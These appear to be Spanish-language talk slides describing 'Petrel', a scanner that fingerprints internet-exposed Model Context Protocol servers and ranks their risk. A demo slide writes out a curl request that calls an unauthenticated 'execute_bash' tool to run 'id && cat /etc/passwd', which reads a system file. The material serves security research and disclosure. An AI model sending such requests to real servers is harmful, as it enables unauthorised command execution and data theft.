CONTEXTO — MODEL CONTEXT PROTOCOL

MCP: JSON-RPC sobre HTTP o stdio

  • Protocolo de Anthropic — standard de facto para AI tools
  • Claude · Cursor · Copilot · Windsurf · n8n
  • Transportes: stdio (local) y Streamable HTTP (internet)
  • Handshake: initialize → tools/list → invoke
initialize da server name, version, capabilities.
Sin auth requerida por defecto en la spec.
POST /mcp HTTP/1.1 Content-Type: application/json { "jsonrpc": "2.0", "id": 1, "method": "initialize", "params": { "protocolVersion": "2024-11-05", "clientInfo": {"name": "petrel"} } } → 200 OK → serverInfo.name: "prod-data-server" → capabilities.tools: {}

FINGERPRINTING SEMÁNTICO

Habla el protocolo. No lee el puerto.

Para cada candidato, Petrel ejecuta el handshake MCP completo:

1initialize → server name, version, platform
2tools/list (paginado) → inventory completo
3Auth check → 401/403 en data plane
4Annotations → destructive, readOnly
5Platform detection → Vercel/Railway/Fly/HF
petrel probe https://target.example.com server_name: prod-assistant protocol_version: 2024-11-05 platform: railway auth_state: none behind_cloudflare: false tools (12): execute_bash [destructive] read_file [readOnly: false] list_directory [readOnly] get_weather [readOnly] ... risk_tier: CRITICAL priority_score: 97/100
RISK SCORING

Priority score 0-100 por server

El risk tier (CRITICAL/HIGH/LOW/INFO) se calcula de:

EXECbash, shell, run_command, code_exec
FS_READread_file, list_dir + sin auth → CRITICAL
SAMPLINGsampling + FS_READ → CRITICAL
NETWORKfetch_url + exfil patterns
SCHEMAnested inputSchema (depth ≤ 3)
INSTRserver_instructions: injection/creds
priority_score 0-100: ordena dentro del mismo tier.
feed-corvus exporta sorted por score → CS17 ya tiene los 42 CRITICAL primero.

DEMO — ACTO 3

"Esto no es un ataque sofisticado.
Es curl."

curl -s -X POST https://target.example.com/mcp \ -H "Content-Type: application/json" \ -d '{ "jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": { "name": "execute_bash", "arguments": { "command": "id && cat /etc/passwd" } } }'
No corremos el comando. Lo mostramos.

La pregunta no es "¿se puede?" — el servidor está en producción y no tiene auth. La pregunta es cuánto tardó alguien en llegar primero.
Sin credenciales. Sin sesión. Sin token.

El mismo request que haría cualquier cliente MCP legítimo. No hay forma de distinguirlo en los logs.
